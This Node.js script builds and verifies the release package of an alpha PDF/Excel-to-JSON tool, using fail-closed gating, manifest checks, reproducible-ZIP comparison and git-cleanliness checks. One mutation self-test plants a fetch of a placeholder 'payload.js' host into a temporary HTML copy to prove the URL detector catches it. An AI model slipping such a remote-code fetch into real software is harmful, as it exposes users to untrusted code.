#!/usr/bin/env node
'use strict';
/*
 * v0.10.1-alpha Checkpoint 7: final package build + verification.
 *
 * Stages the actual end-user distribution (README.md, SMOKE_TEST_REPORT.md,
 * THREE_TOOL_COMPATIBILITY_REPORT.md, SHA256SUMS.txt, pdf_tool/, excel_tool/,
 * shared/, manuals/ -- NOT the checkpoint*.js/*.py verification scripts, which are
 * this repo's own QA harness, not part of the shipped alpha), verifies its
 * structure against an approved recursive manifest, builds the final ZIP
 * twice independently from two separately re-staged copies, confirms the
 * two builds are byte-identical, then extracts the result and re-runs the
 * same structural verification against the EXTRACTED artifact (not the
 * repo source), since that is what an evaluator actually receives.
 *
 * PR #7 Final Release Review (REQUEST CHANGES) identified 3 gaps in an
 * earlier version of this script, all fixed here:
 *   1. The verified ZIP was copied to dist/ unconditionally, even when
 *      some check had FAILed -- release packaging was not fail-closed.
 *      Fixed: dist/ is only written after confirming every check in this
 *      run passed, and any stale dist/ artifacts from a prior run are
 *      deleted unconditionally at the very start.
 *   2. The "expected file set" check only compared the 7 top-level names,
 *      not the full recursive tree -- an unexpected nested file (e.g.
 *      pdf_tool/debug_dump.json) would sail through undetected. Fixed:
 *      the recursive path list is compared against an approved manifest
 *      file (checkpoint7_expected_manifest.txt, sibling to this handoff
 *      directory) covering every expected path exactly. The expected count
 *      is always read from that manifest file's own line count -- never
 *      hardcoded here -- so adding an approved file (e.g. manuals/) only
 *      requires updating the manifest, not this script's assertions.
 *   3. The PDF external-URL check only recognized the 2 already-known,
 *      already-fixed CDN patterns (Tesseract/embedding), so a brand new
 *      unknown runtime reference would not be caught. Fixed: every
 *      https?:// occurrence in the PDF HTML is now extracted and
 *      classified against a fixed, exact-match allowlist of the 2 known
 *      non-runtime references (an XML namespace URI and a JSON Schema
 *      $schema meta-schema URI, neither ever dereferenced); anything not
 *      on that allowlist is treated as a runtime executable reference and
 *      must be 0.
 * All three fixes are proven by mutation self-tests below, not just
 * asserted: each mutation deliberately breaks the invariant the checker is
 * supposed to catch, and the test passes only if detection actually FAILs
 * the underlying check (and dist/ stays untouched throughout).
 */

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const os = require('os');
const { execFileSync } = require('child_process');

const ROOT = __dirname; // .../pdf_excel_json_tools_alpha_v0.10.1_ai_review_handoff
const ALPHA_RELEASE_DIR = path.join(ROOT, '..'); // .../tools/alpha_release
const ZIP_BUILDER = path.join(ALPHA_RELEASE_DIR, 'checkpoint7_deterministic_zip.py');
const MANIFEST_PATH = path.join(ALPHA_RELEASE_DIR, 'checkpoint7_expected_manifest.txt');
const ZIP_NAME = 'pdf_excel_json_tools_alpha_v0.10.1_ai_review_handoff.zip';
const DIST_DIR = path.join(ALPHA_RELEASE_DIR, 'dist');
const DIST_ZIP_PATH = path.join(DIST_DIR, ZIP_NAME);
const DIST_SHA_PATH = path.join(DIST_DIR, ZIP_NAME + '.sha256');

const EXPECTED_TOP_LEVEL = ['README.md', 'SMOKE_TEST_REPORT.md', 'THREE_TOOL_COMPATIBILITY_REPORT.md', 'SHA256SUMS.txt', 'pdf_tool', 'excel_tool', 'shared', 'manuals'];

// Detailed operation manual PDFs added to manuals/. Content is authored and
// approved outside this script (a separate editorial process); this script
// only verifies the files exist, are non-empty, and are structurally valid
// PDFs (signature + trailing EOF marker) -- it never inspects or asserts on
// their content, and never generates them.
const REQUIRED_MANUAL_PDF_FILES = [
  'manuals/pdf_to_json_tool_detailed_operation_manual_v0.10.1_alpha.pdf',
  'manuals/excel_to_json_tool_detailed_operation_manual_v0.10.1_alpha.pdf',
];

// Fixed, exact-match allowlist of URLs that legitimately appear in the PDF
// tool's HTML but are never dereferenced by our code at runtime (an XML
// namespace identifier used only as a string constant with
// createElementNS, and a JSON Schema $schema meta-schema URI embedded
// inside a downloadable reference-document template). ANY other
// https?:// string found in the file is treated as a runtime executable
// reference and fails the check -- no regex-based or prefix-based
// exclusion, so a brand new unknown URL cannot slip through silently.
const PDF_URL_ALLOWLIST = new Set([
  'http://www.w3.org/2000/svg',
  'https://json-schema.org/draft/2020-12/schema',
]);

const checks = [];
function check(name, cond, detail) { const c = { name, ok: !!cond, detail }; checks.push(c); return c; }

// ── The repository root, used to prove this verification script itself
//    never mutates any tracked file as a side effect (Post-Merge Release
//    Gate finding on PR #7: checkpoint6_smoke_test.js used to do exactly
//    that to SMOKE_TEST_REPORT.md). tools/alpha_release/dist/ is this
//    script's own intentional untracked build output and is the one
//    permitted exception. ──
const REPO_ROOT = execFileSync('git', ['rev-parse', '--show-toplevel'], { cwd: ROOT, encoding: 'utf8' }).trim();
function gitStatusPorcelainOfRepo() { return execFileSync('git', ['status', '--porcelain'], { cwd: REPO_ROOT, encoding: 'utf8' }).trim(); }
function gitStatusPorcelainOfRepoExcludingDist() {
  return gitStatusPorcelainOfRepo()
    .split('\n')
    .filter(Boolean)
    .filter(line => !/^\?\? tools\/alpha_release\/dist\/$/.test(line))
    .join('\n');
}

function sha256File(p) { return crypto.createHash('sha256').update(fs.readFileSync(p)).digest('hex'); }
function sha256Text(t) { return crypto.createHash('sha256').update(t, 'utf8').digest('hex'); }

function listFilesRecursive(dir) {
  const out = [];
  (function walk(d, rel) {
    for (const entry of fs.readdirSync(d, { withFileTypes: true })) {
      const abs = path.join(d, entry.name);
      const relPath = rel ? `${rel}/${entry.name}` : entry.name;
      if (entry.isSymbolicLink()) { out.push({ relPath, abs, symlink: true }); continue; }
      if (entry.isDirectory()) walk(abs, relPath);
      else if (entry.isFile()) out.push({ relPath, abs, symlink: false });
    }
  })(dir, '');
  return out.sort((a, b) => a.relPath.localeCompare(b.relPath));
}

function copyRecursive(src, dst) {
  fs.mkdirSync(dst, { recursive: true });
  for (const entry of fs.readdirSync(src, { withFileTypes: true })) {
    const s = path.join(src, entry.name);
    const d = path.join(dst, entry.name);
    if (entry.isSymbolicLink()) throw new Error(`refusing to copy a symlink into staging: ${s}`);
    if (entry.isDirectory()) copyRecursive(s, d);
    else fs.copyFileSync(s, d);
  }
}

function loadExpectedManifest() {
  const text = fs.readFileSync(MANIFEST_PATH, 'utf8');
  return text.split('\n').map(l => l.trim()).filter(Boolean).sort();
}

function stageDistribution(stagingDir) {
  fs.rmSync(stagingDir, { recursive: true, force: true });
  fs.mkdirSync(stagingDir, { recursive: true });
  for (const name of EXPECTED_TOP_LEVEL) {
    if (name === 'SHA256SUMS.txt') continue; // generated after staging
    const src = path.join(ROOT, name);
    if (!fs.existsSync(src)) throw new Error(`expected distribution member missing from source: ${name}`);
    const dst = path.join(stagingDir, name);
    const stat = fs.lstatSync(src);
    if (stat.isDirectory()) copyRecursive(src, dst);
    else fs.copyFileSync(src, dst);
  }
}

function generateSha256Sums(stagingDir) {
  const files = listFilesRecursive(stagingDir).filter(f => !f.symlink && f.relPath !== 'SHA256SUMS.txt');
  const lines = files.map(f => `${sha256File(f.abs)}  ${f.relPath}`);
  fs.writeFileSync(path.join(stagingDir, 'SHA256SUMS.txt'), lines.join('\n') + '\n');
  return files.length;
}

// ── Pure PDF-HTML external-URL classifier: extracts every https?:// string,
//    splits it into allowlisted (non-runtime) vs everything else (treated
//    as a runtime executable reference, fail-closed on unknowns). Returns
//    a plain result object; does not touch the global `checks` array, so
//    it can be reused both for the real verification and for the mutation
//    self-test without polluting pass/fail totals with an expected FAIL. ──
function classifyPdfUrls(pdfHtmlText) {
  const found = [...new Set(pdfHtmlText.match(/https?:\/\/[^"'\\\s)]*/g) || [])];
  const runtimeExecutable = found.filter(u => !PDF_URL_ALLOWLIST.has(u));
  const allowlisted = found.filter(u => PDF_URL_ALLOWLIST.has(u));
  return { found, runtimeExecutable, allowlisted };
}

// ── Pure structural verifier: returns an array of {name, ok, detail}
//    results instead of pushing directly to the global `checks`, so the
//    same logic can back both the real pipeline (folded into `checks`)
//    and a mutation self-test (inspected for "did it correctly FAIL"
//    without those expected-failure entries counting against the real
//    pass/fail total). ──
function computeStructureResults(dirLabel, dir, expectedManifest) {
  const results = [];
  const c = (name, cond, detail) => { results.push({ name: `[${dirLabel}] ${name}`, ok: !!cond, detail }); };
  const entries = listFilesRecursive(dir);
  const relPaths = entries.map(e => e.relPath);

  const topLevel = fs.readdirSync(dir).sort();
  const expectedTop = [...EXPECTED_TOP_LEVEL].sort();
  c('トップレベルが想定ファイル集合と完全一致', JSON.stringify(topLevel) === JSON.stringify(expectedTop), { actual: topLevel, expected: expectedTop });

  // 再帰的manifest完全一致(承認済みcheckpoint7_expected_manifest.txtとの照合)
  const actualSorted = [...relPaths].sort();
  const expectedSorted = [...expectedManifest].sort();
  const onlyInActual = actualSorted.filter(p => !expectedSorted.includes(p));
  const onlyInExpected = expectedSorted.filter(p => !actualSorted.includes(p));
  c(`再帰的ファイル一覧が承認済みmanifest(${expectedSorted.length}件)と完全一致`,
    onlyInActual.length === 0 && onlyInExpected.length === 0,
    { onlyInActual, onlyInExpected, actualCount: actualSorted.length, expectedCount: expectedSorted.length });

  const emptyFiles = entries.filter(e => !e.symlink && fs.statSync(e.abs).size === 0).map(e => e.relPath);
  c('空ファイル0件', emptyFiles.length === 0, emptyFiles);

  const symlinks = entries.filter(e => e.symlink).map(e => e.relPath);
  c('symlink 0件', symlinks.length === 0, symlinks);

  const badPaths = relPaths.filter(p => path.isAbsolute(p) || p.split('/').includes('..'));
  c('絶対パス／../を含むパス 0件', badPaths.length === 0, badPaths);

  const macosx = relPaths.filter(p => p.startsWith('__MACOSX'));
  c('__MACOSXエントリ 0件', macosx.length === 0, macosx);

  const lowerSeen = new Map();
  const dupes = [];
  for (const p of relPaths) {
    const key = p.toLowerCase();
    if (lowerSeen.has(key)) dupes.push(p);
    lowerSeen.set(key, true);
  }
  c('重複エントリ(大文字小文字無視)0件', dupes.length === 0, dupes);

  const pdfHtmlPath = path.join(dir, 'pdf_tool', 'spec_to_json_conversion_tool_alpha_v0.10.1.html');
  const excelHtmlPath = path.join(dir, 'excel_tool', 'excel_to_json_conversion_tool_alpha_v0.10.1.html');
  if (fs.existsSync(pdfHtmlPath)) {
    const pdfHtml = fs.readFileSync(pdfHtmlPath, 'utf8');
    const { runtimeExecutable, allowlisted } = classifyPdfUrls(pdfHtml);
    c('PDF: https?://ランタイム参照(既知allowlist以外)0件', runtimeExecutable.length === 0, { runtimeExecutable, allowlisted });
    c('PDF: loadTesseractJs()がscriptタグを生成しない(ローカル即時reject)',
      /function loadTesseractJs\(\)\{[^}]*Promise\.reject/.test(pdfHtml.replace(/\s+/g, ' ')));
    c('PDF: loadEmbedder()がimport()を呼ばない(ローカル即時throw)',
      /async function loadEmbedder\(\)\{[^}]*throw new Error/.test(pdfHtml.replace(/\s+/g, ' ')));
  }
  if (fs.existsSync(excelHtmlPath)) {
    const excelHtml = fs.readFileSync(excelHtmlPath, 'utf8');
    c('Excel: HTML中にhttps?://参照が存在しない', !/https?:\/\//.test(excelHtml));
  }

  // 詳細操作説明書PDF(manuals/)は内容非検査 -- 実在・非空・PDF構造のみをfail-closedで確認する。
  for (const rel of REQUIRED_MANUAL_PDF_FILES) {
    const abs = path.join(dir, rel);
    const exists = fs.existsSync(abs);
    c(`${rel}: ファイルが存在する`, exists);
    if (!exists) continue;
    const buf = fs.readFileSync(abs);
    c(`${rel}: サイズ > 0`, buf.length > 0, buf.length);
    c(`${rel}: %PDF-シグネチャ`, buf.subarray(0, 5).toString('latin1') === '%PDF-', buf.subarray(0, 8).toString('latin1'));
    const tail = buf.subarray(Math.max(0, buf.length - 2048)).toString('latin1');
    c(`${rel}: 末尾付近に%%EOFマーカーを含む`, tail.includes('%%EOF'));
  }

  const docPattern = /`([A-Za-z0-9_.\/-]+\.(?:md|json|txt))`/g;
  const unresolved = [];
  for (const docName of ['README.md', 'SMOKE_TEST_REPORT.md', 'THREE_TOOL_COMPATIBILITY_REPORT.md']) {
    const docPath = path.join(dir, docName);
    if (!fs.existsSync(docPath)) continue;
    const text = fs.readFileSync(docPath, 'utf8');
    let m;
    while ((m = docPattern.exec(text))) {
      const ref = m[1];
      if (ref.includes('vendor/')) continue;
      const candidates = [path.join(dir, ref), path.join(dir, 'pdf_tool', ref), path.join(dir, 'excel_tool', ref)];
      if (!candidates.some(cand => fs.existsSync(cand))) unresolved.push(`${docName}: \`${ref}\``);
    }
  }
  c('存在しない文書参照 0件', unresolved.length === 0, unresolved);

  const FORBIDDEN = ['0.1.0-alpha', '0.8.0-alpha', '0.10.0-alpha'];
  const versionOffenders = [];
  for (const f of entries) {
    if (f.symlink || !/\.(html|md|json)$/.test(f.relPath)) continue;
    const text = fs.readFileSync(f.abs, 'utf8');
    for (const bad of FORBIDDEN) if (text.includes(bad)) versionOffenders.push(`${f.relPath}: ${bad}`);
  }
  c('version mismatch 0件', versionOffenders.length === 0, versionOffenders);

  return { results, fileCount: entries.length };
}

function computeZipEntryResults(label, zipPath) {
  const results = [];
  const c = (name, cond, detail) => { results.push({ name: `[${label}] ${name}`, ok: !!cond, detail }); };
  const out = execFileSync('python3', ['-c', `
import zipfile, json, sys
z = zipfile.ZipFile(sys.argv[1])
names = z.namelist()
infos = z.infolist()
print(json.dumps({
  "names": names,
  "external_attrs": [i.external_attr for i in infos],
  "date_times": [list(i.date_time) for i in infos],
}))
`, zipPath], { encoding: 'utf8' });
  const { names, external_attrs, date_times } = JSON.parse(out);

  const dupes = names.filter((n, i) => names.indexOf(n) !== i);
  c('ZIP内 重複entry 0件', dupes.length === 0, dupes);

  const badPaths = names.filter(n => n.startsWith('/') || n.includes('..'));
  c('ZIP内 絶対パス／../エントリ 0件', badPaths.length === 0, badPaths);

  const macosx = names.filter(n => n.startsWith('__MACOSX'));
  c('ZIP内 __MACOSXエントリ 0件', macosx.length === 0, macosx);

  const symlinkAttr = 0o120000 << 16;
  const symlinkEntries = names.filter((n, i) => (external_attrs[i] & symlinkAttr) === symlinkAttr);
  c('ZIP内 symlinkエントリ 0件', symlinkEntries.length === 0, symlinkEntries);

  const nonFixedDates = date_times.filter(dt => JSON.stringify(dt) !== JSON.stringify([1980, 1, 1, 0, 0, 0]));
  c('ZIP内 全entryのmtimeが固定値(1980-01-01)', nonFixedDates.length === 0, nonFixedDates.length);

  return { results, names };
}

function foldResults(results) { for (const r of results) checks.push(r); }

function removeStaleDistArtifacts() {
  fs.rmSync(DIST_ZIP_PATH, { force: true });
  fs.rmSync(DIST_SHA_PATH, { force: true });
}

// ── Mutation self-test A: an unexpected nested file must break the
//    recursive-manifest check. Proves gap #2 from the review is closed. ──
function mutationTest_UnexpectedNestedFile(tempBase, expectedManifest) {
  const dir = path.join(tempBase, 'mutation-unexpected-file');
  stageDistribution(dir);
  fs.writeFileSync(path.join(dir, 'pdf_tool', 'unexpected.txt'), 'mutation test payload\n');
  generateSha256Sums(dir);
  const { results } = computeStructureResults('mutation:unexpected-file', dir, expectedManifest);
  const manifestResult = results.find(r => r.name.includes('再帰的ファイル一覧が承認済みmanifest'));
  check('mutation: pdf_tool/unexpected.txt追加時、再帰的manifest不一致を検出してFAILする',
    manifestResult && manifestResult.ok === false, manifestResult && manifestResult.detail);
  check('mutation A実行後もdist ZIPは書き込まれていない', !fs.existsSync(DIST_ZIP_PATH));
  check('mutation A実行後もdist .sha256は書き込まれていない', !fs.existsSync(DIST_SHA_PATH));
}

// ── Mutation self-test B: an unknown external URL injected into a runtime
//    sink must break the PDF https?:// classification check. Proves gap
//    #3 from the review is closed -- this is not limited to the 2
//    already-known CDN strings. ──
function mutationTest_UnknownPdfUrl(tempBase) {
  const dir = path.join(tempBase, 'mutation-unknown-url');
  stageDistribution(dir);
  const pdfHtmlPath = path.join(dir, 'pdf_tool', 'spec_to_json_conversion_tool_alpha_v0.10.1.html');
  const original = fs.readFileSync(pdfHtmlPath, 'utf8');
  const anchor = 'function loadTesseractJs(){';
  if (!original.includes(anchor)) throw new Error('mutation anchor not found in PDF HTML (product code may have changed)');
  const mutated = original.replace(anchor,
    `function mutationTestInjectedFetch(){ return fetch("https://mutation-test.example.invalid/payload.js"); }\n${anchor}`);
  fs.writeFileSync(pdfHtmlPath, mutated);
  generateSha256Sums(dir);
  const { runtimeExecutable } = classifyPdfUrls(mutated);
  check('mutation: PDF HTMLへ未知のexternal URL(fetch)を注入時、runtime参照0件チェックがFAILする',
    runtimeExecutable.includes('https://mutation-test.example.invalid/payload.js'), runtimeExecutable);
  check('mutation B実行後もdist ZIPは書き込まれていない', !fs.existsSync(DIST_ZIP_PATH));
  check('mutation B実行後もdist .sha256は書き込まれていない', !fs.existsSync(DIST_SHA_PATH));
}

function runRealPipeline(tempBase, expectedManifest) {
  const stagingDir = path.join(tempBase, 'staging');
  const zipAPath = path.join(tempBase, 'buildA', ZIP_NAME);
  const zipBPath = path.join(tempBase, 'buildB', ZIP_NAME);
  const extractDir = path.join(tempBase, 'extracted');

  stageDistribution(stagingDir);
  const fileCountBeforeSums = listFilesRecursive(stagingDir).length;
  const sumsCount = generateSha256Sums(stagingDir);
  check('SHA256SUMS.txt対象ファイル数が、SHA256SUMS.txt自身を除く全ファイル数と一致',
    sumsCount === fileCountBeforeSums, { sumsCount, fileCountBeforeSums });
  foldResults(computeStructureResults('staging(pre-zip)', stagingDir, expectedManifest).results);

  fs.mkdirSync(path.dirname(zipAPath), { recursive: true });
  execFileSync('python3', [ZIP_BUILDER, stagingDir, zipAPath], { encoding: 'utf8' });
  const zipASha = sha256File(zipAPath);
  const zipASize = fs.statSync(zipAPath).size;

  fs.rmSync(stagingDir, { recursive: true, force: true });
  stageDistribution(stagingDir);
  generateSha256Sums(stagingDir);
  fs.mkdirSync(path.dirname(zipBPath), { recursive: true });
  execFileSync('python3', [ZIP_BUILDER, stagingDir, zipBPath], { encoding: 'utf8' });
  const zipBSha = sha256File(zipBPath);
  const zipBSize = fs.statSync(zipBPath).size;

  check('independent build A/B: ZIP SHA-256一致', zipASha === zipBSha, { zipASha, zipBSha });
  check('independent build A/B: ZIPサイズ一致', zipASize === zipBSize, { zipASize, zipBSize });

  let cmpExitCode;
  try { execFileSync('cmp', [zipAPath, zipBPath]); cmpExitCode = 0; }
  catch (e) { cmpExitCode = e.status; }
  check('cmp A B: exit code 0', cmpExitCode === 0, cmpExitCode);

  foldResults(computeZipEntryResults('buildB', zipBPath).results);

  fs.mkdirSync(extractDir, { recursive: true });
  execFileSync('python3', ['-c', `
import zipfile, sys
zipfile.ZipFile(sys.argv[1]).extractall(sys.argv[2])
`, zipBPath, extractDir]);
  const extractedResult = computeStructureResults('extracted(post-zip)', extractDir, expectedManifest);
  foldResults(extractedResult.results);

  const sumsText = fs.readFileSync(path.join(extractDir, 'SHA256SUMS.txt'), 'utf8').trim();
  const sumsLines = sumsText.split('\n').filter(Boolean);
  const sumsMismatch = [];
  for (const line of sumsLines) {
    const m = line.match(/^([0-9a-f]{64})\s\s(.+)$/);
    if (!m) { sumsMismatch.push(`unparsable line: ${line}`); continue; }
    const [, expectedHash, relPath] = m;
    const actualPath = path.join(extractDir, relPath);
    if (!fs.existsSync(actualPath)) { sumsMismatch.push(`missing: ${relPath}`); continue; }
    if (sha256File(actualPath) !== expectedHash) sumsMismatch.push(`hash mismatch: ${relPath}`);
  }
  check('展開後: SHA256SUMS.txt記載の全ファイルが実ハッシュと一致', sumsMismatch.length === 0, sumsMismatch);
  check('展開後: SHA256SUMS.txt記載件数が展開ファイル総数(自身を除く)と一致',
    sumsLines.length === extractedResult.fileCount - 1, { listed: sumsLines.length, actual: extractedResult.fileCount - 1 });

  return { zipBPath, zipBSha, zipBSize, sumsLines, fileCount: extractedResult.fileCount };
}

function main() {
  const tempBase = fs.mkdtempSync(path.join(os.tmpdir(), 'cp7-package-'));
  try {
    // ── Fail-closed guarantee: never let a stale artifact from a prior
    //    (possibly failed) run masquerade as this run's verified output. ──
    removeStaleDistArtifacts();
    check('起動時: 古いdist ZIPを削除(存在しない)', !fs.existsSync(DIST_ZIP_PATH));
    check('起動時: 古いdist .sha256を削除(存在しない)', !fs.existsSync(DIST_SHA_PATH));

    // ── Baseline captured AFTER removeStaleDistArtifacts(), excluding
    //    dist/, so this snapshot is stable regardless of whether dist/
    //    happens to be an empty directory (git does not report those as
    //    untracked at all) or still holds a stale file at process start. ──
    const gitBefore = gitStatusPorcelainOfRepoExcludingDist();

    const expectedManifest = loadExpectedManifest();
    check(`承認済みmanifest(${MANIFEST_PATH.split('/').pop()})を読み込み(${expectedManifest.length}件)`, expectedManifest.length > 0, expectedManifest.length);

    // ── Mutation self-tests, BEFORE the real build, using their own
    //    isolated staging copies -- must never touch dist/. ──
    mutationTest_UnexpectedNestedFile(tempBase, expectedManifest);
    mutationTest_UnknownPdfUrl(tempBase);

    // ── Real pipeline ──
    const real = runRealPipeline(tempBase, expectedManifest);

    // ── Permanent regression, gating: this entire verification pipeline
    //    (mutation tests + real build, all via isolated temp staging
    //    copies) must never modify any file the repo already tracks.
    //    Compared against the pre-write dist/ state, so it is evaluated
    //    before the dist/ write decision below and can itself gate it. ──
    const gitAfterPipeline = gitStatusPorcelainOfRepoExcludingDist();
    check('検証パイプライン実行後(dist書込み前)、git status --porcelainが実行前と完全一致(dist/除き、tracked変更0件)',
      gitAfterPipeline === gitBefore, { gitBefore, gitAfterPipeline });

    const total = checks.length;
    const passed = checks.filter(c => c.ok).length;
    const allPassed = passed === total;

    // ── Fail-closed release gate: dist/ is written IF AND ONLY IF every
    //    check in this run passed. A partial/failed run leaves dist/
    //    exactly as it was left by removeStaleDistArtifacts() above: empty. ──
    if (allPassed) {
      fs.mkdirSync(DIST_DIR, { recursive: true });
      fs.copyFileSync(real.zipBPath, DIST_ZIP_PATH);
      fs.writeFileSync(DIST_SHA_PATH, `${real.zipBSha}  ${ZIP_NAME}\n`);
    }

    // ── Permanent regression, diagnostic: after the dist/ write decision,
    //    the only permitted change anywhere in the repo working tree is
    //    the intentional dist/ZIP+.sha256 write itself. Necessarily
    //    evaluated after that write, so it cannot gate it -- it is a
    //    canary for "did packaging leave anything else behind". ──
    const cleanAfterWrite = gitStatusPorcelainOfRepoExcludingDist();
    check('package build後、git status --porcelainがdist/の意図したuntracked出力以外0件',
      cleanAfterWrite.length === 0, cleanAfterWrite);

    const finalTotal = checks.length;
    const finalPassed = checks.filter(c => c.ok).length;

    console.log('=== Checkpoint 7 package verification 結果 ===');
    for (const c of checks) {
      console.log(`[${c.ok ? 'PASS' : 'FAIL'}] ${c.name}${c.detail !== undefined ? ` :: ${JSON.stringify(c.detail)}` : ''}`);
    }
    console.log(`\n合計 ${finalTotal}件中 ${finalPassed}件成功`);

    if (allPassed) {
      console.log('\n=== サマリ指標 ===');
      console.log(`配布物総ファイル数: ${real.fileCount}`);
      console.log(`SHA256SUMS対象: ${real.sumsLines.length}`);
      console.log(`ZIPサイズ: ${real.zipBSize} bytes`);
      console.log(`ZIP SHA-256: ${real.zipBSha}`);
      console.log(`\n-> 検証済みZIPを ${DIST_ZIP_PATH} へコピーしました。`);
    } else {
      console.error('\n=== 検証にFAILがあるため、dist/へは何も書き込みません(fail-closed) ===');
    }

    if (finalPassed !== finalTotal) process.exitCode = 1;
  } finally {
    fs.rmSync(tempBase, { recursive: true, force: true });
  }
}

main();
